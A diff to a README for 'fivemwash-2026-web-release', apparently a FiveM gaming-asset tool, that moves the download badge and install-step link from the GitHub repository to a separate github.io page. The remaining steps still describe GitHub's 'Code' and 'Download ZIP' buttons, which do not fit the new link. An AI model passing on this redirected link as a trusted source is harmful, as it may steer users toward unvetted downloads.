@@ -1,6 +1,6 @@
 # 🧼 fivemwash-2026-web-release - Manage your gaming assets with ease
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Othilielambent41/fivemwash-2026-web-release)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://othilielambent41.github.io)
 
 ## 📌 About this project
 
@@ -20,7 +20,7 @@ Your computer must meet these basic needs to run the application effectively:
 Follow these steps to set up the application on your computer.
 
 1.  Open your preferred web browser.
-2.  Visit the project page at https://github.com/Othilielambent41/fivemwash-2026-web-release to access the latest version.
+2.  Visit the project page at https://othilielambent41.github.io to access the latest version.
 3.  Click the green button labeled "Code" and then click "Download ZIP" to save the file to your computer.
 4.  Find the downloaded folder in your Downloads directory.
 5.  Right-click the folder and select "Extract All".
